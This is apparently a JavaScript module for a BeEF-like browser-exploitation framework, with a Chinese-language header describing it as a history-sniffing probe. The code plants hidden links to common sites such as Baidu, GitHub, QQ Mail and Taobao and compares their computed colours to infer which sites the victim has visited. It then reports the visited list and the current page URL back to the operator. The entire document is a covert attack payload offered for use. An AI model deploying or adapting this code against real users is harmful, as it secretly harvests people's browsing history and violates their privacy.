// MODULE = {"desc": "历史记录探测:链接颜色差异探测访问过的站点(BeEF get_visited_domains;注意现代浏览器隐私保护可能失效)", "category": "信息收集", "params": [["urls", "探测 URL 列表,逗号分隔(默认常见站点)"]]}
(function () {
  var targets = _q("urls", "{{urls}}") ||
    "https://www.baidu.com,https://www.google.com,https://github.com,https://mail.qq.com,https://mail.163.com,https://www.taobao.com,https://www.jd.com";
  var list = targets.split(",");
  var visited = [];
  function probe(url) {
    try {
      var a = document.createElement('a');
      a.href = url;
      a.style.color = 'rgb(0, 0, 0)';
      a.style.visibility = 'hidden';
      a.style.position = 'absolute';
      document.body.appendChild(a);
      var c1 = getComputedStyle(a).color;
      var b = a.cloneNode(false);
      document.body.appendChild(b);
      var c2 = getComputedStyle(b).color;
      document.body.removeChild(b);
      document.body.removeChild(a);
      if (c1 !== c2) { visited.push(url); }
    } catch (e) {}
  }
  for (var i = 0; i < list.length; i++) { probe(list[i].trim()); }
  report({ type: "history", url: location.href, visited: visited, probed: list.length });
})();
